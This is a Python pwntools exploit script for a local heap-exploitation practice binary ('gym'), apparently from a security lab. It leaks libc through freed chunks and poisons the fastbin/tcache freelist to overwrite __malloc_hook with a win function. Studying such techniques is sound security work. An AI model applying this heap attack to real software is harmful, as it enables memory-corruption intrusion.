#!/usr/bin/python3
# ./attack.py GDB or ./attack.py
# To disable ASLR, run this first: setarch `uname -m` -R /bin/bash

from pwn import process, gdb, args, p64, ELF, context, u64

binary = './gym'

gs = """
break 118
continue
"""

e = ELF(binary)

END_OF_MENU = "e.g., r 1\n"


def malloc(p, size=8):
    p.sendline(b"m %d" % size)
    print("m %d" % size)
    print(p.recvuntil(END_OF_MENU).decode())


def free(p, index):
    p.sendline(b"f %d" % index)
    print("free")
    print(p.recvuntil(END_OF_MENU).decode())


def edit(p, index, content):
    p.sendline(b"e %d %b" % (index, content))
    print(b"e %d %b" % (index, content))
    print(p.recvuntil(END_OF_MENU).decode())


def exit(p):
    p.sendline(b"0")


def list_ptr(p):
    p.sendline(b"l")
    print(p.recvuntil(END_OF_MENU).decode())


def read(p, index):
    p.sendline(b"r %d" % index)
    content = p.recvline()
    print(p.recvuntil(END_OF_MENU).decode())
    return content[:-1]


def get_smallbin(p, base):
    for _ in range(8):
        malloc(p, 0x90)

    for i in range(8):
        free(p, i + base)


def leak_libc(p):
    for _ in range(16):
        malloc(p, 0x300)  # 0 - 15

    for i in range(7):
        free(p, i)
    free(p, 7)

    addr = read(p, 7)

    addr = u64(addr + b'\x00' * (8 - len(addr)))

    offset = 0x155555326ca0 - 0x155554f3b000

    base = addr - offset

    print(hex(base))
    return base


def launch_attack(p):
    # 0. Prepare for tcache bin and fastbin
    # The number of allocated chunks is greater than 7.
    for _ in range(10):
        malloc(p, 0x20)  # index: 0 to 9

    for i in range(10):
        free(p, i)

    # 1. Identify a fake chunk
    base_addr = 0x155554f3b000
    victim_memory = base_addr + e.libc.symbols["__malloc_hook"]
    fake_chunk_addr = victim_memory - 0x10
    # 2. Link the fake chunk to fastbin freelist
    edit(p, 9, p64(fake_chunk_addr))
    # 3. Emptify tcache bin
    for _ in range(7):
        malloc(p, 0x20)  # index: 10 to 16
    # 4. Tcache refill (reversely)
    malloc(p, 0x20)  # index: 17
    # 5. Malloc to get fake chunk
    malloc(p, 0x20)  # index: 18
    # 6. Overwrite victim memory
    edit(p, 18, p64(e.symbols.win))
    # 7. Trigger the vulnerability by calling the victim pointer
    p.interactive()


def main():
    if args.GDB:
        # p = gdb.debug(binary, gdbscript=gs)
        p = process(binary, aslr=False)
        gdb.attach(p.pid)
    else:
        p = process(binary, aslr=False)

    p.recvuntil(END_OF_MENU)
    leak_libc(p)
    # launch_attack(p)

    # Make sure that this is kept for gdb
    # p.interactive()


if __name__ == "__main__":
    main()
